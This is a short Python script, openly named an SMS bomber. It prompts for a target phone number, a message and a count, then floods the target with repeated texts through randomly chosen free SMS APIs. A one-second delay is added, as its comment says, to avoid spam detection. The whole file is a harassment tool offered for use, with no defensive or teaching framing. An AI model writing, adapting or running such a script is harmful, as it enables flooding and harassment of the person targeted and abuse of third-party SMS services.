import requests
import time
import random

# List of free SMS APIs (some may stop working)
APIS = [
    "https://textbelt.com/text",
    "https://api.callmebot.com/sms/send.php",
    "https://www.fast2sms.com/dev/bulkV2"
]

def send_sms(phone_number, message, count):
    for i in range(count):
        api = random.choice(APIS)  # Randomly select an API
        data = {
            "phone": phone_number,
            "message": message,
            "key": "free"  # Some APIs require an API key
        }

        response = requests.post(api, data=data)
        if response.status_code == 200:
            print(f"[+] SMS {i+1}/{count} Sent Successfully via {api}")
        else:
            print(f"[-] SMS {i+1}/{count} Failed via {api}")
        
        time.sleep(1)  # Add delay to avoid spam detection

# User input
phone_number = input("📞 Enter target phone number: ")
message = input("💬 Enter message to send: ")
count = int(input("🔢 Enter number of messages to send: "))

# Run SMS Bomber
send_sms(phone_number, message, count)
